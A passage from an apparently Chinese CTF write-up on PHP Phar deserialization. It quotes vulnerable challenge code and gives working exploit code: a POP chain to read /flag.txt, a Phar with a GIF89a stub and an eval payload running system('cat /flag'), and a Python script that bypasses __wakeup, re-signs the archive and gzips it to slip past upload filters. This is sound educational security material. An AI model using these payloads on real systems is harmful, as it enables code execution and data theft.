operator\">&amp;&amp;</span> <span class=\"token operator\">!</span><span class=\"token function\">is_dir</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">true</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">return</span> <span class=\"token constant boolean\">false</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">filename</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话我们注意到class.php中<code>File</code>类的<code>close()</code>方法，它里面用到了<code>file_get_contents</code>，题目描述了是Phar，那这里大概率是一个突破口，那此时我们就去尝试寻找，谁可以调用这个<code>close</code>方法，最终在<code>User</code>类中的<code>__destruct</code>方法中发现 <code>$this-&gt;db-&gt;close();</code>，这里调用了<code>close</code>方法，但我们需要用的这个<code>close</code>方法是在<code>File</code>类中的，这个时候该怎么办呢，我们在<code>Filelist</code>类中发现有一个<code>__call</code>方法，<code>_call</code>方法是当访问不可访问的方法时触发，这个时候如果我们传入<code>file</code>，它就会由于<code>Filelist</code>中没有<code>close</code>类而调用<code>_call</code>方法，此时就会调用<code>File</code>类里的<code>_call</code>方法，然后将结果存到<code>results[$file-&gt;name()][$func]</code>中，当<code>Filetest</code>销毁时，触发<code>__destruct</code>，此时结果也被打印出来，也就将其中的内容打印了出来<br>这个是逆推的，那么正推的话也就相对来说更简单了</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、创建User对象<span class=\"token operator\">-></span>指向Filetest\n<span class=\"token number\">2</span>、调用Filetest类<span class=\"token operator\">-></span>让它指向File类，因为没有close方法，所以调用__call方法，然后转向File类执行close方法\n<span class=\"token number\">3</span>、成功调用File类中的close方法，将结果存到results<span class=\"token punctuation\">[</span><span class=\"token variable\">$file</span><span class=\"token operator\">-></span><span class=\"token function\">name</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token variable\">$func</span><span class=\"token punctuation\">]</span>中\n<span class=\"token number\">4</span>、Filetest类销毁时触发__destruct魔术方法，输出results中的内容<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>EXP如下</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">User</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">public</span> <span class=\"token variable\">$db</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n       <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">db</span> <span class=\"token operator\">=</span> <span class=\"token string double-quoted-string\">\"new Filelist()\"</span><span class=\"token punctuation\">;</span>\n   <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">FileList</span><span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">private</span> <span class=\"token variable\">$files</span><span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$this</span> <span class=\"token operator\">-></span> <span class=\"token property\">files</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">new</span> <span class=\"token class-name\">File</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span> \n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">File</span> <span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$filename</span> <span class=\"token operator\">=</span> <span class=\"token string single-quoted-string\">'/flag.txt'</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">User</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i.phar'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'&lt;?php __HALT_COMPILER(); ? >'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>抓文件上传的包，修改<code>Content-type</code>为<code>image/png</code>，此时再发包<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205590.png\" alt=\"在这里插入图片描述\"><br>成功上传，接下来去抓删除文件的包，使用phar伪协议来触发反序列化<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205679.png\" alt=\"在这里插入图片描述\"><br>成功获取Flag</p>\n<h2 id=\"NSSRound-4-SWPU-1zweb\"><a href=\"#NSSRound-4-SWPU-1zweb\" class=\"headerlink\" title=\"[NSSRound#4 SWPU]1zweb\"></a>[NSSRound#4 SWPU]1zweb</h2><p>题目环境<a href=\"https://www.ctfer.vip/problem/2484\">https://www.ctfer.vip/problem/2484</a></p>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205730.png\" alt=\"在这里插入图片描述\"><br>进入靶场，发现有个查询文件和上传文件界面，尝试任意文件读取</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">upload<span class=\"token operator\">.</span>php<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205905.png\" alt=\"在这里插入图片描述\"></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">#upload.php\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"error\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">></span> <span class=\"token number\">0</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"上传异常\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token variable\">$allowedExts</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">array</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"gif\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jpeg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"jpg\"</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"png\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$temp</span> <span class=\"token operator\">=</span> <span class=\"token function\">explode</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\".\"</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token variable\">$extension</span> <span class=\"token operator\">=</span> <span class=\"token function\">end</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$temp</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"size\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&amp;&amp;</span> <span class=\"token function\">in_array</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$extension</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$allowedExts</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$content</span><span class=\"token operator\">=</span><span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"tmp_name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$pos</span> <span class=\"token operator\">=</span> <span class=\"token function\">strpos</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$content</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"__HALT_COMPILER();\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token function\">gettype</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$pos</span><span class=\"token punctuation\">)</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"integer\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"ltj一眼就发现了phar\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span><span class=\"token function\">file_exists</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./upload/\"</span> <span class=\"token operator\">.</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">.</span> <span class=\"token string double-quoted-string\">\" 文件已经存在\"</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n                <span class=\"token variable\">$myfile</span> <span class=\"token operator\">=</span> <span class=\"token function\">fopen</span><span class=\"token punctuation\">(</span><span class=\"token string double-quoted-string\">\"./upload/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">,</span> <span class=\"token string double-quoted-string\">\"w\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">fwrite</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">,</span> <span class=\"token variable\">$content</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token function\">fclose</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$myfile</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n                <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"上传成功 ./upload/\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$_FILES</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"file\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">[</span><span class=\"token string double-quoted-string\">\"name\"</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n            <span class=\"token punctuation\">&#125;</span>\n        <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">echo</span> <span class=\"token string double-quoted-string\">\"dky不喜欢这个文件 .\"</span><span class=\"token operator\">.</span><span class=\"token variable\">$extension</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>分析一下这个上传文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、限制文件后缀，只能为gif、jpeg、jpg、png\n<span class=\"token number\">2</span>、检测了文件内容，意味着不能出现<span class=\"token keyword\">__HALT_COMPILER</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p>对于限制文件后缀，我们这里更改文件后缀即可，对于第二个，前文在简述绕过方法时也提到过，这种情况可以将Phar文件进行<code>gzip</code>压缩，从而实现绕过。</p>\n<p>接下来查看一下<code>index.php</code></p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\">#index.php\n<span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">LoveNss</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ljt</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dky</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ljt</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"ljt\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dky</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"dky\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">phpinfo</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__destruct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ljt</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"Misc\"</span><span class=\"token operator\">&amp;&amp;</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dky</span><span class=\"token operator\">===</span><span class=\"token string double-quoted-string\">\"Re\"</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">eval</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ljt</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Re\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dky</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Misc\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$file</span><span class=\"token operator\">=</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">isset</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$_POST</span><span class=\"token punctuation\">[</span><span class=\"token string single-quoted-string\">'file'</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">echo</span> <span class=\"token function\">file_get_contents</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$file</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>这里的话不难看出利用点是<code>__destruct</code>中的<code>eval</code>函数，而这里要求<code>$this-&gt;ljt===&quot;Misc&quot;&amp;&amp;$this-&gt;dky===&quot;Re&quot;</code>，也就是说</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>函数不能执行，否则就达不到要求，即我们需要绕过<span class=\"token function\">__wakeup</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p>我们知道属性大于实际个数可以绕过<code>__wakeup</code>函数，那么我们这里就可以采取这种方式来进行绕过。<br>构造Phar文件</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token php language-php\"><span class=\"token delimiter important\">&lt;?php</span>\n<span class=\"token keyword\">class</span> <span class=\"token class-name-definition class-name\">LoveNss</span><span class=\"token punctuation\">&#123;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$ljt</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$dky</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token variable\">$cmd</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">public</span> <span class=\"token keyword\">function</span> <span class=\"token function-definition function\">__construct</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">ljt</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Misc\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">dky</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"Re\"</span><span class=\"token punctuation\">;</span>\n        <span class=\"token variable\">$this</span><span class=\"token operator\">-></span><span class=\"token property\">cmd</span><span class=\"token operator\">=</span><span class=\"token string double-quoted-string\">\"system('cat /flag');\"</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token variable\">$phar</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">Phar</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'quan9i.phar'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">startBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setStub</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'GIF89a'</span><span class=\"token operator\">.</span><span class=\"token string single-quoted-string\">'&lt;?php __HALT_COMPILER(); ? >'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$a</span> <span class=\"token operator\">=</span> <span class=\"token keyword\">new</span> <span class=\"token class-name\">LoveNss</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">setMetadata</span><span class=\"token punctuation\">(</span><span class=\"token variable\">$a</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">addFromString</span><span class=\"token punctuation\">(</span><span class=\"token string single-quoted-string\">'test.txt'</span><span class=\"token punctuation\">,</span> <span class=\"token string single-quoted-string\">'test'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token variable\">$phar</span><span class=\"token operator\">-></span><span class=\"token function\">stopBuffering</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token delimiter important\">?></span></span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>此时Phar文件生成了，接下来就需要绕过了，这里还需要说明一下，就是当我们更改Phar文件的内容时，签名此时就会变无效，因此这里我们需要再构造一个新的签名。<br>步骤总的来说就是以下四步</p>\n<pre class=\"line-numbers language-php\" data-language=\"php\"><code class=\"language-php\"><span class=\"token number\">1</span>、更改属性值来绕过__wakeup函数\n<span class=\"token number\">2</span>、更改签名\n<span class=\"token number\">2</span>、进行gzip压缩来绕过关键字检测\n<span class=\"token number\">4</span>、更改文件后缀<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p>我们可以利用一个简单的脚本来实现一下</p>\n<pre class=\"line-numbers language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">import</span> gzip\n<span class=\"token keyword\">from</span> hashlib <span class=\"token keyword\">import</span> sha1\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\html\\\\quan9i.phar'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span>\n    f <span class=\"token operator\">=</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\t\ns <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">28</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取要签名的数据</span>\ns <span class=\"token operator\">=</span> s<span class=\"token punctuation\">.</span>replace<span class=\"token punctuation\">(</span><span class=\"token string\">b'3:&#123;'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'4:&#123;'</span><span class=\"token punctuation\">)</span><span class=\"token comment\">#更换属性值，绕过__wakeup</span>\nh <span class=\"token operator\">=</span> f<span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">8</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span> <span class=\"token comment\"># 获取签名类型以及GBMB标识</span>\nnewf <span class=\"token operator\">=</span> s <span class=\"token operator\">+</span> sha1<span class=\"token punctuation\">(</span>s<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>digest<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> h <span class=\"token comment\"># 数据 + 签名 + (类型 + GBMB)</span>\n<span class=\"token comment\">#print(newf)</span>\nnewf <span class=\"token operator\">=</span> gzip<span class=\"token punctuation\">.</span>compress<span class=\"token punctuation\">(</span>newf<span class=\"token punctuation\">)</span> <span class=\"token comment\">#对Phar文件进行gzip压缩</span>\n<span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'D:\\\\phpStudy\\\\PHPTutorial\\\\WWW\\\\html\\\\newquanqi.png'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> <span class=\"token builtin\">file</span><span class=\"token punctuation\">:</span><span class=\"token comment\">#更改文件后缀</span>\n    <span class=\"token builtin\">file</span><span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span>newf<span class=\"token punctuation\">)</span> <span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p>接下来上传文件<br><img src=\"https://quan9i.oss-cn-beijing.aliyuncs.com/img/202303201205161.png\" 